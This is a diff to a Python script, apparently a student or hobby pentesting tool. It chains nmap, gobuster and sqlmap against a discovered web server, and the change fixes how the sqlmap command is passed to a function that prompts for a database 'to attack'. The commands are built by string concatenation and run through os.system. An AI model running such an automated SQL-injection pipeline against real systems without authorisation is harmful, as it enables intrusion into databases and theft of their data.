@@ -84,11 +84,11 @@ def sqlmap(webserver):
     option_chosen = int(input())
     base_cmd = "sqlmap -u " + webserver + hidden_path + injection_options[option_chosen - 1]
     cmd = base_cmd + " --dbs"
-    database_stuff(code_cmd)
     try:
         os.system(cmd)
     except KeyboardInterrupt:
         print ("SQLMap failed. Run script again")
+    return base_cmd
 
 def database_stuff(code_cmd):
     database = input("What database would you like to attack? ")
@@ -106,4 +106,5 @@ if __name__ == "__main__":
      # ASCII art for tool name? Option to show user instructions and purpose of project?
     webserver = nmap_scan() # should we clean up nmap output? put output in a seperate file? Give a warning to user when zero hosts are found?
     gobuster(webserver)
-    sqlmap(webserver)
+    base_cmd = sqlmap(webserver)
+    database_stuff(base_cmd)
